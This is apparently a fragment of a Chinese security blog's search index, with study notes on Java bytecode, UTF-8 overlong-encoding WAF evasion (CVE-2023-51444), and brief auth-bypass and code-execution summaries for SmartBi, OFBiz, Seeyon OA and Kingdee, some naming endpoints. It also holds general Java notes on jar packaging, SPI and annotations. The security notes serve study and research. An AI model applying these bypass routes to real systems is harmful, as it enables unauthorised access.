src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240326173748694.png"> </p><h2 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h2><p>方法结构</p><div class="code-wrapper"><pre><code class="hljs abnf">method_info &#123;    u2             access_flags<span class="hljs-comment">;</span>    u2             name_index<span class="hljs-comment">;</span>    u2             descriptor_index<span class="hljs-comment">;</span>    u2             attributes_count<span class="hljs-comment">;</span>    attribute_info attributes[attributes_count]<span class="hljs-comment">;</span>&#125;</code></pre></div><p><strong>方法的访问标识表</strong></p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240326173822518.png"> </p><h2 id="属性"><a href="#属性" class="headerlink" title="属性"></a>属性</h2><p>属性结构</p><div class="code-wrapper"><pre><code class="hljs nginx"><span class="hljs-section">attribute_info</span> &#123;    <span class="hljs-attribute">u2</span> attribute_name_index;    <span class="hljs-attribute">u4</span> attribute_length;    <span class="hljs-attribute">u1</span> <span class="hljs-literal">info</span>[attribute_length];&#125;</code></pre></div><p><strong>访问标识符表</strong></p><p> <img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240326151307255.png"> </p><p><strong>预定义属性</strong></p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240326174408314.png"> </p><p>为什么要学习字节码？</p><p>RASP</p><p>反编译–HackFernFlower</p><p>JNDI攻击，涉及到字节码的修改</p><p>字节码编辑工具，ASM、JAVASIST、byte buddy</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://docs.oracle.com/javase/specs/jvms/se7/html/jvms-4.html">https://docs.oracle.com/javase/specs/jvms/se7/html/jvms-4.html</a></p>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
      <category>Java安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>UTF8-Overlong-Encode攻击学习</title>
    <link href="/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/Java%E5%AE%89%E5%85%A8/UTF8-Overlong-Encode%E5%AD%A6%E4%B9%A0/"/>
    <url>/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/Java%E5%AE%89%E5%85%A8/UTF8-Overlong-Encode%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<p>CVE-2023-51444</p><p>commit</p><div class="code-wrapper"><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/geoserver/g</span>eoserver<span class="hljs-regexp">/pull/</span><span class="hljs-number">7222</span><span class="hljs-regexp">/commits/</span><span class="hljs-number">7872</span>e92e6037409385e5bf38185fbadd661e23ca</code></pre></div><p>安装</p><p><a href="https://geoserver.org/download/">https://geoserver.org/download/</a></p><div class="code-wrapper"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>docs.geoserver.org<span class="hljs-regexp">/latest/</span>en<span class="hljs-regexp">/user/i</span>nstallation/linux.html</code></pre></div><p><a href="https://github.com/geoserver/geoserver/security/advisories/GHSA-9v5q-2gwq-q9hq">https://github.com/geoserver/geoserver/security/advisories/GHSA-9v5q-2gwq-q9hq</a></p><h1 id="UTF8-Overlong-Encode攻击学习"><a href="#UTF8-Overlong-Encode攻击学习" class="headerlink" title="UTF8-Overlong-Encode攻击学习"></a>UTF8-Overlong-Encode攻击学习</h1><p>由于应用程序未严格按UTF-8标准校验输入的数据，直接将数据解码为字符串，这可一定程度绕过在流量层面针对字符串匹配的安全设备</p><p>目前已知缺陷应用：</p><ul><li>Java Modified UTF-8</li></ul><p>实现了DataInput接口及其子接口的类。ObjectInputStream的readObject</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240322174805488.png"> </p><ul><li>Hessian</li></ul><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p><strong>字符集</strong></p><ul><li>ASCII</li></ul><p>由128个字符组成，包括大小写字母、数字0-9、标点符号、非打印字符（换行符、制表符等4个）以及控制字符（退格、响铃等）组成。标准的ASCII码用一个字节存储，第一位为最高位用作校验码，其余7位用于编码可以表示128个字符</p><ul><li>Unicode</li></ul><p>Unicode字符集可表示世界任意语言的字符。任意一个字符都可使用Unicode的码点来表示。Unicode码点是为每个字符分配的唯一数字标识符</p><p>Unicode码点</p><p>比如<code>a</code>的码点为<code>\u0061</code>，字符<code>我</code>的码点为<code>\u6211</code>，日文字符<code>の</code>的码点为<code>\u306e</code>，俄文字符<code>й</code>的码点为<code>\u0439</code>。Unicode根据不同的语言和使用用途为字符划定了码点的范围</p><p><strong>编码方案</strong></p><p>UTF</p><p>Unicode Tranformation Format，即Unicode转换格式。有4套方案UTF8、UTF16、UTF32</p><p><strong>码点范围</strong></p><p>Unicode为每类字符（用途、语言类别等）设定了一个范围，</p><p>URL</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>一次URL解码引起的思考：<a href="https://mp.weixin.qq.com/s/ytz2WsvPSADYHA520Me9-g">https://mp.weixin.qq.com/s/ytz2WsvPSADYHA520Me9-g</a></p><p>测试环境：<a href="https://github.com/Whoopsunix/utf-8-overlong-encoding">https://github.com/Whoopsunix/utf-8-overlong-encoding</a></p><p>UTF-8 Overlong Encoding导致的安全问题：<a href="https://www.leavesongs.com/PENETRATION/utf-8-overlong-encoding.html">https://www.leavesongs.com/PENETRATION/utf-8-overlong-encoding.html</a></p><p>Hessian UTF-8 Overlong Encoding：<a href="https://exp10it.io/2024/02/hessian-utf-8-overlong-encoding/">https://exp10it.io/2024/02/hessian-utf-8-overlong-encoding/</a></p><p>Java反序列化Payload缩小技术：<a href="https://developer.aliyun.com/article/1160545">https://developer.aliyun.com/article/1160545</a></p><p><a href="https://docs.oracle.com/javase/7/docs/api/java/io/DataInput.html#modified-utf-8">https://docs.oracle.com/javase/7/docs/api/java/io/DataInput.html#modified-utf-8</a></p>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
      <category>Java安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>漏洞利用总结</title>
    <link href="/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/Java%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/"/>
    <url>/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/Java%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h1 id="权限绕过漏洞总结"><a href="#权限绕过漏洞总结" class="headerlink" title="权限绕过漏洞总结"></a>权限绕过漏洞总结</h1><h3 id="SmartBi权限绕过漏洞"><a href="#SmartBi权限绕过漏洞" class="headerlink" title="SmartBi权限绕过漏洞"></a>SmartBi权限绕过漏洞</h3><p>通过smartbi.freequery.filter.CheckIsLoggedFilter鉴权，存在绕过调用RMIServlet调用任意类执行代码</p><h3 id="Apache-OFBiz身份认证绕过漏洞"><a href="#Apache-OFBiz身份认证绕过漏洞" class="headerlink" title="Apache OFBiz身份认证绕过漏洞"></a>Apache OFBiz身份认证绕过漏洞</h3><p>在org.apache.ofbiz.webapp.control.ControlServlet中，通过RequestHandler来处理不同的事件，通过org.apache.ofbiz.webapp.control.LoginWorker#extensionCheckLogin鉴权，存在绕过</p><h3 id="致远OA权限绕过"><a href="#致远OA权限绕过" class="headerlink" title="致远OA权限绕过"></a>致远OA权限绕过</h3><p>访问&#x2F;seeyon&#x2F;m-signature&#x2F;RunSignature&#x2F;run接口需要身份认证，配合无需身份认证的接口&#x2F;getAjaxDataServlet绕过认证</p><h3 id="金蝶权限绕过"><a href="#金蝶权限绕过" class="headerlink" title="金蝶权限绕过"></a>金蝶权限绕过</h3><p>通过安全约束来进行身份认证，</p><p>CVE-2022-32532</p><p>CVE-2022-22978</p><p><a href="https://zhuanlan.zhihu.com/p/562074166?utm_id=0">https://zhuanlan.zhihu.com/p/562074166?utm_id=0</a></p><h1 id="命令执行漏洞总结"><a href="#命令执行漏洞总结" class="headerlink" title="命令执行漏洞总结"></a>命令执行漏洞总结</h1><h2 id="通过groovy执行代码"><a href="#通过groovy执行代码" class="headerlink" title="通过groovy执行代码"></a>通过groovy执行代码</h2><p>Apache OFBiz CVE_2023_51467</p><h2 id="通过JavaScript引擎执行代码"><a href="#通过JavaScript引擎执行代码" class="headerlink" title="通过JavaScript引擎执行代码"></a>通过JavaScript引擎执行代码</h2><p>Rhino  泛微Ecology</p><h2 id="通过表达式执行代码"><a href="#通过表达式执行代码" class="headerlink" title="通过表达式执行代码"></a>通过表达式执行代码</h2><p>EL SPEL</p><h2 id="通过类加载执行代码"><a href="#通过类加载执行代码" class="headerlink" title="通过类加载执行代码"></a>通过类加载执行代码</h2>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
      <category>Java安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java代码片段</title>
    <link href="/%E4%BB%A3%E7%A0%81%E7%89%87%E6%AE%B5/Java/"/>
    <url>/%E4%BB%A3%E7%A0%81%E7%89%87%E6%AE%B5/Java/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码错误" data-whm="Oh, these decrypted content cannot be verified, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="fb2385b59f1cde7f1f59c1a65e6c84bc824176a0644a3538115f3e32d53923a9"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">输入密码查看</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>代码片段</category>
      
      <category>Java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java</tag>
      
      <tag>Encryption</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>打包</title>
    <link href="/%E7%BC%96%E7%A8%8B%E6%8A%80%E6%9C%AF/Java/%E6%89%93%E5%8C%85/"/>
    <url>/%E7%BC%96%E7%A8%8B%E6%8A%80%E6%9C%AF/Java/%E6%89%93%E5%8C%85/</url>
    
    <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><h2 id="Jar包"><a href="#Jar包" class="headerlink" title="Jar包"></a>Jar包</h2><p><strong>是什么</strong></p><p>一系列的压缩文件，类似zip文件，可直接解压</p><p><strong>打包原理</strong></p><p>java使用javac命令将java文件编译为class字节码文件，后用jar命令将文件压缩为jar文件</p><p><strong>有什么用</strong></p><p>作为库文件供第三方导入使用</p><p>作为程序独立使用</p><h2 id="MANIFEST文件"><a href="#MANIFEST文件" class="headerlink" title="MANIFEST文件"></a>MANIFEST文件</h2><p>是什么</p><p>jar包的清单文件，位于jar包&#x2F;META-INF&#x2F;MANIFEST.MF，在打包成功后自动创建。</p><p>有什么用</p><p>记录该项目的一些元数据，包括打包的时间，打包软件类型，项目的主类，还可以自定义属性信息</p><h2 id="INDEX-LIST"><a href="#INDEX-LIST" class="headerlink" title="INDEX.LIST"></a>INDEX.LIST</h2><p>记录项目的文件清单</p><h1 id="打包方式"><a href="#打包方式" class="headerlink" title="打包方式"></a>打包方式</h1><h2 id="命令行打Jar包"><a href="#命令行打Jar包" class="headerlink" title="命令行打Jar包"></a>命令行打Jar包</h2><h3 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h3><ul><li>Jar包内自动生成META-INF\MANIFEST.MF文件</li></ul><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><p>jar命令</p><div class="code-wrapper"><pre><code class="hljs diff"><span class="hljs-deletion">-c 创建档案</span><span class="hljs-deletion">-v 显示详细信息</span><span class="hljs-deletion">-f 指定档案名称</span><span class="hljs-deletion">-m 指定manifest文件路径</span><span class="hljs-deletion">-M 不为档案创建manifest文件</span><span class="hljs-deletion">-e 指定程序入口点，即MainClass类路径</span></code></pre></div><p>创建jar包</p><div class="code-wrapper"><pre><code class="hljs pgsql">jar -cvf <span class="hljs-built_in">new</span>-jar.jar /<span class="hljs-type">path</span>/<span class="hljs-keyword">to</span>/classfile</code></pre></div><p>替换jar包内文件</p><p>替换MANIFEST.MF文件</p><div class="code-wrapper"><pre><code class="hljs java">jar cvfM <span class="hljs-keyword">new</span>-jar.jar META-INF\\MANIFEST.MF *</code></pre></div><p>替换lib、class文件</p><div class="code-wrapper"><pre><code class="hljs java">jar cvfM <span class="hljs-keyword">new</span>-jar.jar *</code></pre></div><h2 id="Maven打Jar包"><a href="#Maven打Jar包" class="headerlink" title="Maven打Jar包"></a>Maven打Jar包</h2><h3 id="特点-1"><a href="#特点-1" class="headerlink" title="特点"></a>特点</h3><ul><li>自动生成META-INF\MANIFEST.MF文件</li><li>同时在META-INF目录生成maven目录，里面存放着项目的pom.xml和pom.properties文件</li></ul>]]></content>
    
    
    <categories>
      
      <category>编程技术</category>
      
      <category>Java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SPI机制</title>
    <link href="/%E7%BC%96%E7%A8%8B%E6%8A%80%E6%9C%AF/Java/SPI%E6%9C%BA%E5%88%B6/"/>
    <url>/%E7%BC%96%E7%A8%8B%E6%8A%80%E6%9C%AF/Java/SPI%E6%9C%BA%E5%88%B6/</url>
    
    <content type="html"><![CDATA[<h1 id="什么是SPI机制"><a href="#什么是SPI机制" class="headerlink" title="什么是SPI机制"></a>什么是SPI机制</h1><p>SPI机制是java6以后引入的一种服务发现机制，用于扩展系统的功能。服务提供方提供一个接口，第三方系统实现该接口以扩展服务提供方更多的功能。</p><h1 id="SPI机制的实现"><a href="#SPI机制的实现" class="headerlink" title="SPI机制的实现"></a>SPI机制的实现</h1><h2 id="服务提供方"><a href="#服务提供方" class="headerlink" title="服务提供方"></a>服务提供方</h2><p>应用系统提供的接口</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example;<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Fruit</span> &#123;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">say</span><span class="hljs-params">()</span>;&#125;</code></pre></div><p>实现接口</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Apple</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Fruit</span>&#123;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">say</span><span class="hljs-params">()</span> &#123;        System.out.println(<span class="hljs-string">&quot;I am apple.&quot;</span>);    &#125;&#125;<span class="hljs-keyword">package</span> com.example;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Peach</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Fruit</span>&#123;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">say</span><span class="hljs-params">()</span> &#123;        System.out.println(<span class="hljs-string">&quot;I am peach.&quot;</span>);    &#125;&#125;<span class="hljs-keyword">package</span> com.example;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Pear</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Fruit</span>&#123;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">say</span><span class="hljs-params">()</span> &#123;        System.out.println(<span class="hljs-string">&quot;I am pear.&quot;</span>);    &#125;&#125;</code></pre></div><p>在自身的resources目录下创建META-INF&#x2F;services&#x2F;目录，并在其内创建应用系统提供的接口全限定名命名的文件，文件内容为该接口实现类的全限定名</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/1.png"></p><h2 id="应用系统"><a href="#应用系统" class="headerlink" title="应用系统"></a>应用系统</h2><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example;<span class="hljs-keyword">import</span> java.util.ServiceLoader;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">GetFruit</span> &#123;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;        ServiceLoader&lt;Fruit&gt; fruitServiceLoader = ServiceLoader.load(Fruit.class);        <span class="hljs-keyword">for</span> (Fruit fruit: fruitServiceLoader)&#123;            fruit.say();        &#125;    &#125;&#125;</code></pre></div><p>可成功执行服务提供方的方法</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/2.png"></p><h1 id="JDK中SPI机制的实现原理"><a href="#JDK中SPI机制的实现原理" class="headerlink" title="JDK中SPI机制的实现原理"></a>JDK中SPI机制的实现原理</h1><h2 id="线程上下文类加载器"><a href="#线程上下文类加载器" class="headerlink" title="线程上下文类加载器"></a>线程上下文类加载器</h2><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-type">ClassLoader</span> <span class="hljs-variable">cl</span> <span class="hljs-operator">=</span> Thread.currentThread().getContextClassLoader();</code></pre></div><h2 id="ServiceLoader"><a href="#ServiceLoader" class="headerlink" title="ServiceLoader"></a>ServiceLoader</h2><p>ServiceLoader是JDK提供的专门用于实现SPI机制的类。</p><p>查找接口中的实现类</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">hasNextService</span><span class="hljs-params">()</span> &#123;            <span class="hljs-keyword">if</span> (nextName != <span class="hljs-literal">null</span>) &#123;                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;            &#125;            <span class="hljs-keyword">if</span> (configs == <span class="hljs-literal">null</span>) &#123;                <span class="hljs-keyword">try</span> &#123;                    <span class="hljs-type">String</span> <span class="hljs-variable">fullName</span> <span class="hljs-operator">=</span> PREFIX + service.getName();                    <span class="hljs-keyword">if</span> (loader == <span class="hljs-literal">null</span>)                        configs = ClassLoader.getSystemResources(fullName);                    <span class="hljs-keyword">else</span>                        configs = loader.getResources(fullName);                &#125; <span class="hljs-keyword">catch</span> (IOException x) &#123;                    fail(service, <span class="hljs-string">&quot;Error locating configuration files&quot;</span>, x);                &#125;            &#125;            <span class="hljs-keyword">while</span> ((pending == <span class="hljs-literal">null</span>) || !pending.hasNext()) &#123;                <span class="hljs-keyword">if</span> (!configs.hasMoreElements()) &#123;                    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;                &#125;                pending = parse(service, configs.nextElement());            &#125;            nextName = pending.next();            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;        &#125;</code></pre></div><p>加载接口中的实现类</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">private</span> S <span class="hljs-title function_">nextService</span><span class="hljs-params">()</span> &#123;            <span class="hljs-keyword">if</span> (!hasNextService())                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">NoSuchElementException</span>();            <span class="hljs-type">String</span> <span class="hljs-variable">cn</span> <span class="hljs-operator">=</span> nextName;            nextName = <span class="hljs-literal">null</span>;            Class&lt;?&gt; c = <span class="hljs-literal">null</span>;            <span class="hljs-keyword">try</span> &#123;                c = Class.forName(cn, <span class="hljs-literal">false</span>, loader);            &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException x) &#123;                fail(service,                     <span class="hljs-string">&quot;Provider &quot;</span> + cn + <span class="hljs-string">&quot; not found&quot;</span>);            &#125;            <span class="hljs-keyword">if</span> (!service.isAssignableFrom(c)) &#123;                fail(service,                     <span class="hljs-string">&quot;Provider &quot;</span> + cn  + <span class="hljs-string">&quot; not a subtype&quot;</span>);            &#125;            <span class="hljs-keyword">try</span> &#123;                <span class="hljs-type">S</span> <span class="hljs-variable">p</span> <span class="hljs-operator">=</span> service.cast(c.newInstance());                providers.put(cn, p);                <span class="hljs-keyword">return</span> p;            &#125; <span class="hljs-keyword">catch</span> (Throwable x) &#123;                fail(service,                     <span class="hljs-string">&quot;Provider &quot;</span> + cn + <span class="hljs-string">&quot; could not be instantiated&quot;</span>,                     x);            &#125;            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>();          <span class="hljs-comment">// This cannot happen</span>        &#125;</code></pre></div><p>JDK中的SPI实现，是由ServiceLoader类根据自定义传入类加载器或者Application类加载器在约定好的固定路径下（ClassPath：META-INF&#x2F;services&#x2F;）去查找和加载第三方接口实现类。</p><p>要使用JDK中的SPI机制有几个前提条件</p><ul><li>服务提供方必须实现目标接口</li><li>服务提供方必须在自身ClassPath:META-INF&#x2F;services&#x2F;路径下建立文件，<strong>文件名为目标接口全限定名。文件内容为实现目标接口的具体实现类全限定名</strong></li></ul><h1 id="SPI机制的应用"><a href="#SPI机制的应用" class="headerlink" title="SPI机制的应用"></a>SPI机制的应用</h1><h2 id="JDBC"><a href="#JDBC" class="headerlink" title="JDBC"></a>JDBC</h2><p>Java提供java.sql.Driver接口，数据库驱动需要实现该接口</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/3.png"></p><h2 id="Apache-Dubbo"><a href="#Apache-Dubbo" class="headerlink" title="Apache Dubbo"></a>Apache Dubbo</h2><p>扩展协议</p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://blog.csdn.net/qq_42394044/article/details/127833884">https://blog.csdn.net/qq_42394044/article/details/127833884</a></p>]]></content>
    
    
    <categories>
      
      <category>编程技术</category>
      
      <category>Java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>注解</title>
    <link href="/%E7%BC%96%E7%A8%8B%E6%8A%80%E6%9C%AF/Java/%E6%B3%A8%E8%A7%A3/"/>
    <url>/%E7%BC%96%E7%A8%8B%E6%8A%80%E6%9C%AF/Java/%E6%B3%A8%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<h1 id="注解"><a href="#注解" class="headerlink" title="注解"></a>注解</h1><h2 id="是什么"><a href="#是什么" class="headerlink" title="是什么"></a>是什么</h2><p>以@interface方式定义的接口，也称元数据，与class，interface，enum类型属于同一级别</p><h2 id="有什么用"><a href="#有什么用" class="headerlink" title="有什么用"></a>有什么用</h2><ul><li>给类配置一些元数据</li><li>代码编译前语法检查</li></ul><h2 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h2><p>java框架，如spring，springmvc</p><p>需要给类添加一些元数据供使用中获取，如作者信息，需要的依赖等</p><h1 id="常用注解"><a href="#常用注解" class="headerlink" title="常用注解"></a>常用注解</h1><h2 id="Override"><a href="#Override" class="headerlink" title="@Override"></a>@Override</h2><h2 id="Deprecated"><a href="#Deprecated" class="headerlink" title="@Deprecated"></a>@Deprecated</h2><h2 id="SuppressWarnings"><a href="#SuppressWarnings" class="headerlink" title="@SuppressWarnings"></a>@SuppressWarnings</h2><h2 id="Inherited"><a href="#Inherited" class="headerlink" title="@Inherited"></a>@Inherited</h2><p>允许子类继承父类的注解</p><h2 id="Documented"><a href="#Documented" class="headerlink" title="@Documented"></a>@Documented</h2><p>指示编译器将被注解的元素的注释信息包含在生成的API文档中</p><h2 id="Retention"><a href="#Retention" class="headerlink" title="@Retention"></a>@Retention</h2><p>指定注解的最大生命周期，表示注解在什么运行级别前有效</p><div class="code-wrapper"><pre><code class="hljs gradle">参数类型为RetentionPolicy枚举类型的值RetentionPolicy value();RetentionPolicy.<span class="hljs-keyword">SOURCE</span>  表示在源码期间有效，可用于代码的语法检查RetentionPolicy.<span class="hljs-keyword">CLASS</span>表示注解在源码和编译期间有效，若注解类不配置@Retention，则默认使用该级别RetentionPolicy.<span class="hljs-keyword">RUNTIME</span>表示注解在源码，编译，运行时均有效详见：java.lang.annotation.RetentionPolicy</code></pre></div><h2 id="Target"><a href="#Target" class="headerlink" title="@Target"></a>@Target</h2><p>指定注解声明的位置，如类上，方法上，字段上</p><div class="code-wrapper"><pre><code class="hljs scss">参数类型为枚举类型的数组ElementType<span class="hljs-selector-attr">[]</span> <span class="hljs-built_in">value</span>();如：ElementType<span class="hljs-selector-class">.TYPE</span>声明在类或接口上ElementType<span class="hljs-selector-class">.FIELD</span>声明在字段上ElementType<span class="hljs-selector-class">.METHOD</span>声明在方法上ElementType<span class="hljs-selector-class">.PARAMETER</span>声明在参数上ElementType<span class="hljs-selector-class">.CONSTRUCTOR</span>ElementType<span class="hljs-selector-class">.LOCAL_VARIABLE</span>ElementType<span class="hljs-selector-class">.ANNOTATION_TYPE</span>声明在注解类上详见：java<span class="hljs-selector-class">.lang</span><span class="hljs-selector-class">.annotation</span><span class="hljs-selector-class">.ElementType</span></code></pre></div><h1 id="注解的使用"><a href="#注解的使用" class="headerlink" title="注解的使用"></a>注解的使用</h1><h2 id="创建注解"><a href="#创建注解" class="headerlink" title="创建注解"></a>创建注解</h2><div class="code-wrapper"><pre><code class="hljs actionscript"><span class="hljs-keyword">public</span> @<span class="hljs-keyword">interface</span> 注解类名 &#123;&#125;</code></pre></div><h2 id="创建注解的参数-可选"><a href="#创建注解的参数-可选" class="headerlink" title="创建注解的参数(可选)"></a>创建注解的参数(可选)</h2><div class="code-wrapper"><pre><code class="hljs scss">参数格式：参数类型 参数名();参数类型 参数名() default 默认参数值;如：String<span class="hljs-selector-attr">[]</span> <span class="hljs-built_in">name</span>();String <span class="hljs-built_in">name</span>() default &quot;Tom&quot;;</code></pre></div><h2 id="配置注解的注解-可选"><a href="#配置注解的注解-可选" class="headerlink" title="配置注解的注解(可选)"></a>配置注解的注解(可选)</h2><p>@Target：指定该注解类声明的位置，如在类上声明，方法上声明，字段上声明等</p><p>@Retention</p><p>@Documented</p><h2 id="反射获取注解的参数值"><a href="#反射获取注解的参数值" class="headerlink" title="反射获取注解的参数值"></a>反射获取注解的参数值</h2><ul><li>获取使用了注解的类</li><li>获取注解</li><li>获取注解的值</li></ul><div class="code-wrapper"><pre><code class="hljs abnf">Class&lt;Student1&gt; clz <span class="hljs-operator">=</span> Student1.class<span class="hljs-comment">;</span>Student annotation <span class="hljs-operator">=</span> clz.getAnnotation(Student.class)<span class="hljs-comment">;</span>String name <span class="hljs-operator">=</span> annotation.name()<span class="hljs-comment">;</span>int age <span class="hljs-operator">=</span> annotation.age()<span class="hljs-comment">;</span>String[] hobby <span class="hljs-operator">=</span> annotation.hobby()<span class="hljs-comment">;</span></code></pre></div><h1 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h1><p><strong>Author.java</strong></p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.lang.annotation.*;<span class="hljs-meta">@Retention(value = RetentionPolicy.RUNTIME)</span><span class="hljs-meta">@Target( &#123; ElementType.TYPE &#125; )</span><span class="hljs-meta">@Inherited</span><span class="hljs-keyword">public</span> <span class="hljs-meta">@interface</span> Author &#123;    String <span class="hljs-title function_">name</span><span class="hljs-params">()</span> <span class="hljs-keyword">default</span> <span class="hljs-string">&quot;your_name&quot;</span>;    <span class="hljs-type">int</span> <span class="hljs-title function_">age</span><span class="hljs-params">()</span> <span class="hljs-keyword">default</span> -<span class="hljs-number">1</span>;    String <span class="hljs-title function_">profile</span><span class="hljs-params">()</span> <span class="hljs-keyword">default</span> <span class="hljs-string">&quot;&lt;https://www.example.com&gt;&quot;</span>;&#125;</code></pre></div><p><strong>Product.java</strong></p>]]></content>
    
    
    <categories>
      
      <category>编程技术</category>
      
      <category>Java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>反射机制</title>
    <link href="/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/Java%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/"/>
    <url>/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/Java%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/</url>
    
